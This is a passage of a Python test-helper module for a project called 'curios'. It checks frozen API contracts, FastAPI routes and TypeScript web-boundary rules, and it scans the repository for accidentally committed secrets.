    return tuple(nodes)


def _python_files(root: Path) -> tuple[Path, ...]:
    return tuple(sorted(path for path in root.rglob("*.py") if path.is_file()))


def _parse_python(path: Path) -> ast.Module:
    return ast.parse(path.read_text(encoding="utf-8"), filename=path.as_posix())


def _parse_contract_text(module_name: str, source: str) -> ast.Module:
    return ast.parse(source, filename=module_name)


def _is_public_name(name: str) -> bool:
    return not name.startswith("_")


def _call_name(node: ast.AST) -> str:
    match node:
        case ast.Name(id=name):
            return name
        case ast.Attribute(value=value, attr=attr):
            parent = _call_name(value)
            return f"{parent}.{attr}" if parent else attr
        case _:
            return ""


def _annotation_is_type_alias(annotation: ast.AST) -> bool:
    return _call_name(annotation).endswith("TypeAlias")


def _assignment_kind(value: ast.AST) -> str:
    if isinstance(value, ast.Call):
        call_name = _call_name(value.func)
        if call_name.endswith("NewType"):
            return "newtype"
        if call_name.endswith("TypeAliasType"):
            return "type_alias"
        if call_name.endswith(("NamedTuple", "TypedDict")):
            return "typed_structure"
    return "assignment"


def _public_contract_declarations(tree: ast.Module) -> tuple[tuple[str, str], ...]:
    declarations: list[tuple[str, str]] = []
    for node in tree.body:
        if isinstance(node, ast.ClassDef) and _is_public_name(node.name):
            declarations.append((node.name, "class"))
        elif isinstance(node, ast.FunctionDef | ast.AsyncFunctionDef) and _is_public_name(
            node.name
        ):
            declarations.append((node.name, "function"))
        elif isinstance(node, ast.Assign):
            for target in node.targets:
                if isinstance(target, ast.Name) and _is_public_name(target.id):
                    declarations.append((target.id, _assignment_kind(node.value)))
        elif isinstance(node, ast.AnnAssign) and isinstance(node.target, ast.Name):
            if _is_public_name(node.target.id):
                kind = "type_alias" if _annotation_is_type_alias(node.annotation) else "annotation"
                declarations.append((node.target.id, kind))
        elif isinstance(node, getattr(ast, "TypeAlias", ())):
            name = getattr(node.name, "id", "")
            if _is_public_name(name):
                declarations.append((name, "type_alias"))
    return tuple(declarations)


def _public_class_member_declarations(tree: ast.Module) -> dict[str, tuple[tuple[str, str], ...]]:
    class_members: dict[str, tuple[tuple[str, str], ...]] = {}
    for node in tree.body:
        if not isinstance(node, ast.ClassDef) or not _is_public_name(node.name):
            continue
        members: list[tuple[str, str]] = []
        for statement in node.body:
            if isinstance(statement, ast.FunctionDef | ast.AsyncFunctionDef) and _is_public_name(
                statement.name
            ):
                members.append((statement.name, "method"))
            elif isinstance(statement, ast.AnnAssign) and isinstance(statement.target, ast.Name):
                if _is_public_name(statement.target.id):
                    kind = (
                        "type_alias"
                        if _annotation_is_type_alias(statement.annotation)
                        else "annotation"
                    )
                    members.append((statement.target.id, kind))
            elif isinstance(statement, ast.Assign):
                for target in statement.targets:
                    if isinstance(target, ast.Name) and _is_public_name(target.id):
                        members.append((target.id, _assignment_kind(statement.value)))
            elif isinstance(statement, getattr(ast, "TypeAlias", ())):
                name = getattr(statement.name, "id", "")
                if _is_public_name(name):
                    members.append((name, "type_alias"))
        class_members[node.name] = tuple(members)
    return class_members


def _contract_module_authority_violations(
    module_name: str,
    source: str,
) -> tuple[str, ...]:
    tree = _parse_contract_text(module_name, source)
    return _python_module_authority_violations(
        module_name,
        tree,
        FROZEN_CONTRACT_DECLARATIONS_BY_MODULE[module_name],
        FROZEN_CONTRACT_CLASS_MEMBERS_BY_MODULE.get(module_name, {}),
    )


def _python_module_authority_violations(
    module_name: str,
    tree: ast.Module,
    expected_declarations: tuple[tuple[str, str], ...],
    expected_members_by_class: dict[str, tuple[tuple[str, str], ...]],
) -> tuple[str, ...]:
    violations: list[str] = []

    actual_declarations = _public_contract_declarations(tree)
    if actual_declarations != expected_declarations:
        violations.append(
            f"{module_name} public declarations changed: expected {expected_declarations!r}; "
            f"got {actual_declarations!r}"
        )

    if expected_members_by_class:
        actual_members_by_class = _public_class_member_declarations(tree)
        for class_name, expected_members in expected_members_by_class.items():
            actual_members = actual_members_by_class.get(class_name)
            if actual_members != expected_members:
                violations.append(
                    f"{module_name}:{class_name} members changed: "
                    f"expected {expected_members!r}; got {actual_members!r}"
                )

    return tuple(violations)


def _core_runtime_module_authority_violations(
    source_root: Path,
    module_name: str,
    source: str,
    expected_declarations_by_module: dict[str, tuple[tuple[str, str], ...]],
    expected_class_members_by_module: dict[str, dict[str, tuple[tuple[str, str], ...]]],
) -> tuple[str, ...]:
    del source_root
    tree = _parse_contract_text(module_name, source)
    return _python_module_authority_violations(
        module_name,
        tree,
        expected_declarations_by_module[module_name],
        expected_class_members_by_module.get(module_name, {}),
    )


def _fastapi_application_route_authority(
    app: object,
) -> tuple[
    tuple[str, tuple[str, ...], str, str, str, bool],
    ...,
]:
    from fastapi.routing import APIRoute

    routes: list[tuple[str, tuple[str, ...], str, str, str, bool]] = []
    for route in getattr(app, "routes", ()):
        if not isinstance(route, APIRoute):
            continue
        endpoint = route.endpoint
        routes.append(
            (
                route.path,
                tuple(sorted(route.methods or ())),
                route.name,
                getattr(endpoint, "__module__", ""),
                getattr(endpoint, "__qualname__", ""),
                route.include_in_schema,
            )
        )
    return tuple(routes)


def _fastapi_framework_route_authority(
    app: object,
) -> tuple[tuple[str, tuple[str, ...], str, bool], ...]:
    from fastapi.routing import APIRoute

    return tuple(
        (
            getattr(route, "path", ""),
            tuple(sorted(getattr(route, "methods", ()) or ())),
            getattr(route, "name", ""),
            bool(getattr(route, "include_in_schema", False)),
        )
        for route in getattr(app, "routes", ())
        if not isinstance(route, APIRoute)
    )


def _fastapi_route_authority_violations(
    app: object | None = None,
    *,
    application_routes: tuple[tuple[str, tuple[str, ...], str, str, str, bool], ...] | None = None,
    framework_routes: tuple[tuple[str, tuple[str, ...], str, bool], ...] | None = None,
) -> tuple[str, ...]:
    if app is None and application_routes is None and framework_routes is None:
        from curios_api import create_api_composition, create_application

        app = create_application(create_api_composition())
    if application_routes is None:
        assert app is not None
        application_routes = _fastapi_application_route_authority(app)
    if framework_routes is None:
        if app is None:
            framework_routes = FROZEN_FASTAPI_FRAMEWORK_ROUTES
        else:
            framework_routes = _fastapi_framework_route_authority(app)

    violations: list[str] = []
    if application_routes != FROZEN_FASTAPI_APPLICATION_ROUTES:
        violations.append(
            "FastAPI application route authority changed: expected "
            f"{FROZEN_FASTAPI_APPLICATION_ROUTES!r}; got {application_routes!r}"
        )
    if framework_routes != FROZEN_FASTAPI_FRAMEWORK_ROUTES:
        violations.append(
            "FastAPI framework route classification changed: expected "
            f"{FROZEN_FASTAPI_FRAMEWORK_ROUTES!r}; got {framework_routes!r}"
        )
    return tuple(violations)


def _typescript_string_literals(source: str) -> tuple[str, ...]:
    return tuple(
        match.group(2) for match in re.finditer(r"([\"'`])((?:\\.|(?!\1).)*?)\1", source, re.DOTALL)
    )


def _strip_typescript_comments_and_strings(source: str) -> str:
    pieces: list[str] = []
    index = 0
    while index < len(source):
        char = source[index]
        next_char = source[index + 1] if index + 1 < len(source) else ""
        if char in {'"', "'", "`"}:
            quote = char
            pieces.append(" ")
            index += 1
            while index < len(source):
                if source[index] == "\\":
                    pieces.append(" ")
                    index += 2
                    continue
                if source[index] == quote:
                    pieces.append(" ")
                    index += 1
                    break
                pieces.append("\n" if source[index] == "\n" else " ")
                index += 1
            continue
        if char == "/" and next_char == "/":
            pieces.append("  ")
            index += 2
            while index < len(source) and source[index] != "\n":
                pieces.append(" ")
                index += 1
            continue
        if char == "/" and next_char == "*":
            pieces.append("  ")
            index += 2
            while index + 1 < len(source) and source[index : index + 2] != "*/":
                pieces.append("\n" if source[index] == "\n" else " ")
                index += 1
            pieces.append("  ")
            index += 2
            continue
        pieces.append(char)
        index += 1
    return "".join(pieces)


def _typescript_identifier_tokens(source: str) -> tuple[str, ...]:
    cleaned = _strip_typescript_comments_and_strings(source)
    return tuple(re.findall(r"\b[A-Za-z_$][A-Za-z0-9_$]*\b", cleaned))


def _typescript_exports(source: str) -> tuple[str, ...]:
    return tuple(
        match.group(1)
        for match in re.finditer(
            r"\bexport\s+(?:async\s+)?(?:function|interface|type|const)\s+"
            r"([A-Za-z_][A-Za-z0-9_]*)",
            source,
        )
    )


def _typescript_imports(
    source: str,
) -> tuple[tuple[str, tuple[tuple[str, str | None, bool], ...]], ...]:
    imports: list[tuple[int, str, tuple[tuple[str, str | None, bool], ...]]] = []
    for match in re.finditer(
        r"\bimport\s+(?P<body>[^;]*?)\s+from\s*([\"'])(?P<module>[^\"']+)\2\s*;",
        source,
        flags=re.DOTALL,
    ):
        body = match.group("body").strip()
        module = match.group("module")
        if not (body.startswith("{") and body.endswith("}")):
            imports.append((match.start(), module, (("<default-or-namespace>", body, False),)))
            continue
        names: list[tuple[str, str | None, bool]] = []
        for raw_item in body[1:-1].split(","):
            item = raw_item.strip()
            if not item:
                continue
            is_type = False
            if item.startswith("type "):
                is_type = True
                item = item.removeprefix("type ").strip()
            if " as " in item:
                imported, alias = (part.strip() for part in item.split(" as ", maxsplit=1))
            else:
                imported, alias = item, None
            names.append((imported, alias, is_type))
        imports.append((match.start(), module, tuple(names)))
    for match in re.finditer(r"\bimport\s*([\"'])(?P<module>[^\"']+)\1\s*;", source):
        imports.append((match.start(), match.group("module"), ()))
    return tuple((module, names) for _, module, names in sorted(imports, key=lambda item: item[0]))


def _api_boundary_value_imports(source: str) -> dict[str, str]:
    imports: dict[str, str] = {}
    for module, names in _typescript_imports(source):
        if module != "./apiBoundary":
            continue
        for imported, alias, is_type in names:
            if not is_type:
                imports[alias or imported] = imported
    return imports


def _typescript_string_array_const(source: str, const_name: str) -> tuple[str, ...]:
    match = re.search(
        rf"\bexport\s+const\s+{re.escape(const_name)}\s*=\s*\[(?P<body>.*?)\]\s*as\s+const",
        source,
        flags=re.DOTALL,
    )
    if match is None:
        return ()
    return _typescript_string_literals(match.group("body"))


def _typescript_method_literals(source: str) -> tuple[str, ...]:
    return tuple(
        match.group(2) for match in re.finditer(r"\bmethod\s*:\s*([\"'])([^\"']+)\1", source)
    )


def _path_like_web_literals(source: str) -> tuple[str, ...]:
    return tuple(value for value in _typescript_string_literals(source) if value.startswith("/"))


def _network_primitive_hits(source: str, *, allow_fetch: bool) -> tuple[str, ...]:
    hits: list[str] = []
    for primitive in WEB_NETWORK_PRIMITIVES:
        if allow_fetch and primitive == "fetch(":
            continue
        if primitive in source:
            hits.append(primitive)
    return tuple(hits)


def _future_backend_path_hits(source: str) -> tuple[str, ...]:
    literals = _typescript_string_literals(source)
    return tuple(
        literal
        for literal in literals
        if any(token in literal.lower() for token in FUTURE_WEB_BACKEND_PATH_TOKENS)
    )


def _find_matching_brace(source: str, open_brace_index: int) -> int:
    depth = 0
    index = open_brace_index
    while index < len(source):
        char = source[index]
        if char in {'"', "'", "`"}:
            quote = char
            index += 1
            while index < len(source):
                if source[index] == "\\":
                    index += 2
                    continue
                if source[index] == quote:
                    break
                index += 1
        elif source.startswith("//", index):
            newline = source.find("\n", index + 2)
            index = len(source) if newline == -1 else newline
        elif source.startswith("/*", index):
            end = source.find("*/", index + 2)
            index = len(source) if end == -1 else end + 1
        elif char == "{":
            depth += 1
        elif char == "}":
            depth -= 1
            if depth == 0:
                return index
        index += 1
    return -1


def _find_matching_paren(source: str, open_paren_index: int) -> int:
    depth = 0
    index = open_paren_index
    while index < len(source):
        char = source[index]
        if char in {'"', "'", "`"}:
            quote = char
            index += 1
            while index < len(source):
                if source[index] == "\\":
                    index += 2
                    continue
                if source[index] == quote:
                    break
                index += 1
        elif source.startswith("//", index):
            newline = source.find("\n", index + 2)
            index = len(source) if newline == -1 else newline
        elif source.startswith("/*", index):
            end = source.find("*/", index + 2)
            index = len(source) if end == -1 else end + 1
        elif char == "(":
            depth += 1
        elif char == ")":
            depth -= 1
            if depth == 0:
                return index
        index += 1
    return -1


def _split_top_level_arguments(arguments: str) -> tuple[str, ...]:
    parts: list[str] = []
    start = 0
    paren_depth = 0
    brace_depth = 0
    bracket_depth = 0
    index = 0
    while index < len(arguments):
        char = arguments[index]
        if char in {'"', "'", "`"}:
            quote = char
            index += 1
            while index < len(arguments):
                if arguments[index] == "\\":
                    index += 2
                    continue
                if arguments[index] == quote:
                    break
                index += 1
        elif char == "(":
            paren_depth += 1
        elif char == ")":
            paren_depth -= 1
        elif char == "{":
            brace_depth += 1
        elif char == "}":
            brace_depth -= 1
        elif char == "[":
            bracket_depth += 1
        elif char == "]":
            bracket_depth -= 1
        elif char == "," and paren_depth == 0 and brace_depth == 0 and bracket_depth == 0:
            parts.append(arguments[start:index].strip())
            start = index + 1
        index += 1
    parts.append(arguments[start:].strip())
    return tuple(parts)


def _typescript_function_bodies(source: str) -> dict[str, str]:
    functions: dict[str, str] = {}
    for match in re.finditer(
        r"\b(?:export\s+)?(?:async\s+)?function\s+([A-Za-z_$][A-Za-z0-9_$]*)\b[^{]*{",
        source,
    ):
        open_brace = source.find("{", match.start())
        close_brace = _find_matching_brace(source, open_brace)
        if close_brace == -1:
            continue
        functions[match.group(1)] = source[open_brace + 1 : close_brace]
    return functions


def _api_boundary_calls_in_body(body: str, api_imports: dict[str, str]) -> tuple[str, ...]:
    calls: list[str] = []
    cleaned = _strip_typescript_comments_and_strings(body)
    for local_name, imported_name in api_imports.items():
        if re.search(rf"\b{re.escape(local_name)}\s*\(", cleaned):
            calls.append(imported_name)
    return tuple(sorted(calls))


def _jsx_attribute_expression(attributes: str, attribute_name: str) -> str | None:
    match = re.search(rf"\b{re.escape(attribute_name)}\s*=\s*{{", attributes)
    if match is None:
        return None
    open_brace = match.end() - 1
    close_brace = _find_matching_brace(attributes, open_brace)
    if close_brace == -1:
        return None
    return attributes[open_brace + 1 : close_brace]


def _find_jsx_opening_end(source: str, start_index: int) -> int:
    index = start_index
    brace_depth = 0
    while index < len(source):
        char = source[index]
        if char in {'"', "'", "`"}:
            quote = char
            index += 1
            while index < len(source):
                if source[index] == "\\":
                    index += 2
                    continue
                if source[index] == quote:
                    break
                index += 1
        elif char == "{":
            brace_depth += 1
        elif char == "}":
            brace_depth -= 1
        elif char == ">" and brace_depth == 0 and source[index - 1 : index + 1] != "=>":
            return index
        index += 1
    return -1


def _handler_capabilities(
    expression: str,
    functions: dict[str, str],
    api_imports: dict[str, str],
) -> tuple[str, ...]:
    cleaned = _strip_typescript_comments_and_strings(expression)
    capability_calls: set[str] = set()
    handler_calls = re.findall(r"\b([A-Za-z_$][A-Za-z0-9_$]*)\s*\(", cleaned)
    for call in handler_calls:
        if call in api_imports:
            capability_calls.add(api_imports[call])
        elif call in functions:
            capability_calls.update(_api_boundary_calls_in_body(functions[call], api_imports))
    return tuple(sorted(capability_calls))


def _web_app_interactive_capabilities(source: str) -> tuple[tuple[str, str, tuple[str, ...]], ...]:
    functions = _typescript_function_bodies(source)
    api_imports = _api_boundary_value_imports(source)
    capabilities: list[tuple[str, str, tuple[str, ...]]] = []
    for match in re.finditer(r"<(?P<tag>button|form|a)\b", source):
        tag = match.group("tag")
        opening_end = _find_jsx_opening_end(source, match.end())
        if opening_end == -1:
            capabilities.append((tag, "<parse-error>", ()))
            continue
        attributes = source[match.end() : opening_end]
        for event_name in ("onClick", "onSubmit", "onChange"):
            expression = _jsx_attribute_expression(attributes, event_name)
            if expression is None:
                continue
            capabilities.append(
                (
                    tag,
                    event_name,
                    _handler_capabilities(expression, functions, api_imports),
                )
            )
    return tuple(capabilities)


def _exported_api_boundary_request_authority(source: str) -> tuple[tuple[str, str, str], ...]:
    functions = _typescript_function_bodies(source)
    requests: list[tuple[str, str, str]] = []
    for function_name in (
        "createProviderInventoryWork",
        "runProviderInventoryWork",
        "readWork",
        "readExecution",
        "listWorkEvents",
        "listWorkEvidence",
    ):
        body = functions.get(function_name, "")
        match = re.search(r"\brequestJson(?:<[^>]+>)?\s*\(", body)
        if match is None:
            requests.append((function_name, "<missing>", "<missing>"))
            continue
        open_paren = body.find("(", match.start())
        close_paren = _find_matching_paren(body, open_paren)
        if close_paren == -1:
            requests.append((function_name, "<parse-error>", "<parse-error>"))
            continue
        arguments = _split_top_level_arguments(body[open_paren + 1 : close_paren])
        path_expression = " ".join(arguments[0].split()) if arguments else "<missing>"
        method_match = re.search(r"\bmethod\s*:\s*([\"'])(?P<method>[^\"']+)\1", body)
        method = method_match.group("method") if method_match is not None else "GET"
        requests.append((function_name, path_expression, method))
    return tuple(requests)


def _forbidden_identifier_hits(
    source: str,
    forbidden_identifiers: frozenset[str],
) -> tuple[str, ...]:
    identifiers = _typescript_identifier_tokens(source)
    return tuple(identifier for identifier in identifiers if identifier in forbidden_identifiers)


def _web_api_boundary_authority_violations(source: str) -> tuple[str, ...]:
    violations: list[str] = []
    exports = _typescript_exports(source)
    if exports != FROZEN_WEB_API_BOUNDARY_EXPORTS:
        violations.append(
            f"web API boundary exports changed: expected {FROZEN_WEB_API_BOUNDARY_EXPORTS!r}; "
            f"got {exports!r}"
        )
    paths = _typescript_string_array_const(source, "apiBoundaryPaths")
    if paths != FROZEN_WEB_API_BOUNDARY_PATHS:
        violations.append(
            f"web API boundary paths changed: expected {FROZEN_WEB_API_BOUNDARY_PATHS!r}; "
            f"got {paths!r}"
        )
    path_literals = _path_like_web_literals(source)
    if path_literals != FROZEN_WEB_API_BOUNDARY_PATH_LITERALS:
        violations.append(
            "web API boundary path literal authority changed: expected "
            f"{FROZEN_WEB_API_BOUNDARY_PATH_LITERALS!r}; got {path_literals!r}"
        )
    methods = _typescript_method_literals(source)
    if methods != FROZEN_WEB_API_BOUNDARY_METHODS:
        violations.append(
            f"web API boundary HTTP methods changed: expected {FROZEN_WEB_API_BOUNDARY_METHODS!r}; "
            f"got {methods!r}"
        )
    fetch_count = source.count("fetch(")
    if fetch_count != 1:
        violations.append(
            f"web API boundary must contain exactly one fetch call; got {fetch_count}"
        )
    requests = _exported_api_boundary_request_authority(source)
    if requests != FROZEN_WEB_API_BOUNDARY_REQUESTS:
        violations.append(
            "web API boundary request authority changed: expected "
            f"{FROZEN_WEB_API_BOUNDARY_REQUESTS!r}; got {requests!r}"
        )
    forbidden_hits = _forbidden_identifier_hits(
        source,
        WEB_API_BOUNDARY_FORBIDDEN_NETWORK_IDENTIFIERS,
    )
    if forbidden_hits:
        violations.append(
            f"web API boundary unauthorized network identifier(s): {forbidden_hits!r}"
        )
    network_hits = _network_primitive_hits(source, allow_fetch=True)
    if network_hits:
        violations.append(f"web API boundary unauthorized network primitive(s): {network_hits!r}")
    future_hits = _future_backend_path_hits(source)
    if future_hits:
        violations.append(f"web API boundary future backend path literal(s): {future_hits!r}")
    return tuple(violations)


def _web_app_authority_violations(source: str) -> tuple[str, ...]:
    violations: list[str] = []
    exports = _typescript_exports(source)
    if exports != FROZEN_WEB_APP_EXPORTS:
        violations.append(
            f"web App exports changed: expected {FROZEN_WEB_APP_EXPORTS!r}; got {exports!r}"
        )
    imports = _typescript_imports(source)
    import_modules = tuple(module for module, _ in imports)
    if import_modules != FROZEN_WEB_APP_IMPORT_MODULES:
        violations.append(
            f"web App import modules changed: expected {FROZEN_WEB_APP_IMPORT_MODULES!r}; "
            f"got {import_modules!r}"
        )
    imports_by_module = {module: names for module, names in imports}
    for module, expected_imports in FROZEN_WEB_APP_AUTHORITY_IMPORTS_BY_MODULE.items():
        actual_imports = imports_by_module.get(module, ())
        if actual_imports != expected_imports:
            violations.append(
                f"web App authority imports from {module} changed: "
                f"expected {expected_imports!r}; got {actual_imports!r}"
            )
    interactive_capabilities = _web_app_interactive_capabilities(source)
    if interactive_capabilities != FROZEN_WEB_APP_INTERACTIVE_CAPABILITIES:
        violations.append(
            "web App interactive capabilities changed: expected "
            f"{FROZEN_WEB_APP_INTERACTIVE_CAPABILITIES!r}; got {interactive_capabilities!r}"
        )
    forbidden_hits = _forbidden_identifier_hits(source, WEB_APP_FORBIDDEN_CAPABILITY_IDENTIFIERS)
    if forbidden_hits:
        violations.append(f"web App forbidden capability identifier(s): {forbidden_hits!r}")
    network_hits = _network_primitive_hits(source, allow_fetch=False)
    if network_hits:
        violations.append(f"web App unauthorized direct network primitive(s): {network_hits!r}")
    future_hits = _future_backend_path_hits(source)
    if future_hits:
        violations.append(f"web App future backend path literal(s): {future_hits!r}")
    return tuple(violations)


def _contract_init_authority(
    source: str,
) -> tuple[
    tuple[tuple[tuple[str, str | None], tuple[tuple[str, str | None], ...] | None], ...],
    tuple[tuple[str, tuple[tuple[str, str | None], ...]], ...],
    tuple[tuple[str, str], ...],
    tuple[str, ...],
    tuple[str, ...],
]:
    tree = _parse_contract_text("__init__.py", source)
    statements: list[tuple[tuple[str, str | None], tuple[tuple[str, str | None], ...] | None]] = []
    imports: list[tuple[str, tuple[tuple[str, str | None], ...]]] = []
    declarations: list[tuple[str, str]] = []
    all_values: tuple[str, ...] = ()
    initializer_shape_violations: list[str] = []

    for index, node in enumerate(tree.body):
        if (
            index == 0
            and isinstance(node, ast.Expr)
            and isinstance(node.value, ast.Constant)
            and isinstance(node.value.value, str)
        ):
            statements.append((("docstring", None), None))
        elif isinstance(node, ast.ImportFrom) and node.module is not None and node.level == 0:
            import_names = tuple((alias.name, alias.asname) for alias in node.names)
            statements.append((("import_from", node.module), import_names))
            imports.append(
                (
                    node.module,
                    import_names,
                )
            )
        elif isinstance(node, ast.Import):
            import_names = tuple((alias.name, alias.asname) for alias in node.names)
            statements.append((("import", None), import_names))
            imports.append(
                (
                    "<import>",
                    import_names,
                )
            )
        elif isinstance(node, ast.Assign):
            if len(node.targets) != 1 or not isinstance(node.targets[0], ast.Name):
                statements.append((("assign", "<unsupported>"), None))
                initializer_shape_violations.append(
                    f"unsupported assignment statement: {ast.dump(node, include_attributes=False)}"
                )
                continue
            target = node.targets[0]
            statements.append((("assign", target.id), None))
            if target.id == "__version__":
                if not (
                    isinstance(node.value, ast.Constant)
                    and isinstance(node.value.value, str)
                    and node.value.value == "0.0.0"
                ):
                    initializer_shape_violations.append("__version__ assignment changed")
            elif target.id == "__all__":
                if isinstance(node.value, ast.Tuple):
                    all_values = tuple(
                        item.value
                        for item in node.value.elts
                        if isinstance(item, ast.Constant) and isinstance(item.value, str)
                    )
                    if len(all_values) != len(node.value.elts):
                        initializer_shape_violations.append(
                            "__all__ must be an exact tuple of string literals"
                        )
                else:
                    initializer_shape_violations.append("__all__ must be a tuple literal")
            else:
                initializer_shape_violations.append(
                    f"unexpected package initializer assignment target: {target.id}"
                )
            for target in node.targets:
                if not isinstance(target, ast.Name):
                    continue
                if _is_public_name(target.id) or target.id == "__version__":
                    declarations.append((target.id, _assignment_kind(node.value)))
        else:
            statements.append(((type(node).__name__, None), None))
            initializer_shape_violations.append(
                f"unexpected package initializer statement: {type(node).__name__}"
            )
            if isinstance(node, ast.AnnAssign) and isinstance(node.target, ast.Name):
                if _is_public_name(node.target.id) or node.target.id == "__version__":
                    declarations.append((node.target.id, "annotation"))
            elif isinstance(
                node,
                ast.ClassDef | ast.FunctionDef | ast.AsyncFunctionDef,
            ) and _is_public_name(node.name):
                kind = "class" if isinstance(node, ast.ClassDef) else "function"
                declarations.append((node.name, kind))

    return (
        tuple(statements),
        tuple(imports),
        tuple(declarations),
        all_values,
        tuple(initializer_shape_violations),
    )


def _contract_init_authority_violations(source: str) -> tuple[str, ...]:
    (
        actual_statements,
        actual_imports,
        actual_declarations,
        actual_all,
        initializer_shape_violations,
    ) = _contract_init_authority(source)
    violations: list[str] = []
    if actual_statements != FROZEN_CONTRACT_INIT_STATEMENT_SEQUENCE:
        violations.append(
            "curios_contracts.__init__ statement sequence changed: expected "
            f"{FROZEN_CONTRACT_INIT_STATEMENT_SEQUENCE!r}; got {actual_statements!r}"
        )
    if actual_imports != FROZEN_CONTRACT_INIT_IMPORTS:
        violations.append(
            "curios_contracts.__init__ imports changed: expected "
            f"{FROZEN_CONTRACT_INIT_IMPORTS!r}; got {actual_imports!r}"
        )
    violations.extend(initializer_shape_violations)
    if actual_declarations != FROZEN_CONTRACT_INIT_DECLARATIONS:
        violations.append(
            "curios_contracts.__init__ declarations changed: expected "
            f"{FROZEN_CONTRACT_INIT_DECLARATIONS!r}; got {actual_declarations!r}"
        )
    if actual_all != FROZEN_CONTRACT_PACKAGE_EXPORTS:
        violations.append(
            "curios_contracts.__all__ changed: expected "
            f"{FROZEN_CONTRACT_PACKAGE_EXPORTS!r}; got {actual_all!r}"
        )
    return tuple(violations)


def _import_roots(source_root: Path) -> set[str]:
    roots: set[str] = set()
    for source_file in _python_files(source_root):
        tree = _parse_python(source_file)
        for node in ast.walk(tree):
            if isinstance(node, ast.Import):
                roots.update(alias.name.split(".", maxsplit=1)[0] for alias in node.names)
            elif isinstance(node, ast.ImportFrom) and node.module:
                roots.add(node.module.split(".", maxsplit=1)[0])
    return roots


def _declared_class_names(source_root: Path) -> set[str]:
    names: set[str] = set()
    for source_file in _python_files(source_root):
        tree = _parse_python(source_file)
        names.update(node.name for node in ast.walk(tree) if isinstance(node, ast.ClassDef))
    return names


def _function_names(source_root: Path) -> set[str]:
    names: set[str] = set()
    for source_file in _python_files(source_root):
        tree = _parse_python(source_file)
        names.update(
            node.name
            for node in ast.walk(tree)
            if isinstance(node, ast.FunctionDef | ast.AsyncFunctionDef)
        )
    return names


def _tracked_files() -> tuple[Path, ...]:
    result = subprocess.run(
        ["git", "ls-files"],
        check=True,
        cwd=REPO_ROOT,
        text=True,
        capture_output=True,
    )
    return tuple(REPO_ROOT / line for line in result.stdout.splitlines() if line)


def _tracked_security_scan_files() -> tuple[Path, ...]:
    scanned: list[Path] = []
    for path in _tracked_files():
        relative = path.relative_to(REPO_ROOT).as_posix()
        if relative in SECURITY_SCAN_ROOT_FILES or any(
            relative == root or relative.startswith(f"{root}/") for root in SECURITY_SCAN_ROOTS
        ):
            if path.name in {"pnpm-lock.yaml", "uv.lock"}:
                continue
            if path.name == ".env.example" or path.suffix in SECURITY_SCAN_SUFFIXES:
                scanned.append(path)
    return tuple(sorted(scanned))


def _relative_repo_path(path: Path) -> str:
    if path.is_absolute():
        return path.relative_to(REPO_ROOT).as_posix()
    return path.as_posix()


def _is_approved_placeholder(path: Path, key: str, value: str) -> bool:
    relative = _relative_repo_path(path)
    if relative == "infrastructure/local/docker/.env.example":
        return (
            key.startswith("CURIOS_")
            and value.startswith("curios_")
            and ("dev" in value or "local" in value)
        )
    if relative == "infrastructure/local/docker/compose.yaml":
        return key == "POSTGRES_PASSWORD" and value.startswith("${CURIOS_POSTGRES_PASSWORD:-")
    return False


def _is_sensitive_name(name: str) -> bool:
    return SECRET_FIELD_TOKEN_RE.search(name) is not None


def _looks_like_secret_value(value: str) -> bool:
    if value == "":
        return False
    if value.startswith(("sk-", "pk_", "ghp_", "gho_", "xoxb-", "AKIA")):
        return True
    if SECRET_SHAPED_VALUE_RE.search(value) is not None:
        return True
    has_lower = any(character.islower() for character in value)
    has_upper = any(character.isupper() for character in value)
    has_digit = any(character.isdigit() for character in value)
    return len(value) >= 20 and sum((has_lower, has_upper, has_digit)) >= 2


def _python_secret_scan_violations(path: Path, text: str) -> tuple[str, ...]:
    violations: list[str] = []
    tree = ast.parse(text, filename=path.as_posix())
    for node in ast.walk(tree):
        if isinstance(node, ast.Constant) and isinstance(node.value, str):
            if CREDENTIAL_URL_RE.search(node.value) is not None:
                violations.append(f"{path}:{node.lineno}: credential-bearing URL")
        elif isinstance(node, ast.Assign):
            target_names = [
                target.id
                for target in node.targets
                if isinstance(target, ast.Name) and _is_sensitive_name(target.id)
            ]
            if (
                target_names
                and isinstance(node.value, ast.Constant)
                and isinstance(
                    node.value.value,
                    str,
                )
            ):
                value = node.value.value
                if _looks_like_secret_value(value):
                    violations.append(
                        f"{path}:{node.lineno}: secret-shaped assignment {target_names[0]!r}"
                    )
        elif isinstance(node, ast.AnnAssign):
            if (
                isinstance(node.target, ast.Name)
                and _is_sensitive_name(node.target.id)
                and isinstance(node.value, ast.Constant)
                and isinstance(node.value.value, str)
                and _looks_like_secret_value(node.value.value)
            ):
                violations.append(
                    f"{path}:{node.lineno}: secret-shaped assignment {node.target.id!r}"
                )
        elif isinstance(node, ast.keyword):
            if (
                node.arg is not None
                and _is_sensitive_name(node.arg)
                and isinstance(node.value, ast.Constant)
                and isinstance(node.value.value, str)
                and _looks_like_secret_value(node.value.value)
            ):
                violations.append(f"{path}:{node.value.lineno}: secret-shaped keyword {node.arg!r}")
        elif isinstance(node, ast.Dict):
            for key, value_node in zip(node.keys, node.values, strict=False):
                if (
                    isinstance(key, ast.Constant)
                    and isinstance(key.value, str)
                    and _is_sensitive_name(key.value)
                    and isinstance(value_node, ast.Constant)
                    and isinstance(value_node.value, str)
                    and _looks_like_secret_value(value_node.value)
                ):
                    violations.append(
                        f"{path}:{value_node.lineno}: secret-shaped mapping key {key.value!r}"
                    )
    return tuple(violations)


def _secret_scan_violations_for_text(path: Path, text: str) -> tuple[str, ...]:
    if path.suffix == ".py":
        return _python_secret_scan_violations(path, text)

    violations: list[str] = []
    for line_number, line in enumerate(text.splitlines(), start=1):
        if CREDENTIAL_URL_RE.search(line) is not None:
            violations.append(f"{path}:{line_number}: credential-bearing URL")
        for match in SENSITIVE_ASSIGNMENT_RE.finditer(line):
            key = match.group("key")
            value = match.group("value").rstrip(",;")
            if _is_approved_placeholder(path, key, value):
                continue
            violations.append(f"{path}:{line_number}: secret-shaped assignment {key!r}")
    return tuple(violations)


def _secret_field_violations(contract: type[Any]) -> tuple[str, ...]:
    allowed_fields = SECRET_FIELD_ALLOWLIST.get(contract, frozenset())
    violations: list[str] = []
    for field in fields(contract):
        if field.name in allowed_fields:
            continue
        if SECRET_FIELD_TOKEN_RE.search(field.name) is not None:
            violations.append(field.name)
    return tuple(sorted(violations))


def _tracked_package_roots() -> frozenset[str]:
    roots: set[str] = set()
    for path in _tracked_files():
        parts = path.relative_to(REPO_ROOT).parts
        if len(parts) >= 3 and parts[0] == "packages":
            roots.add("/".join(parts[:3]))
    return frozenset(roots)


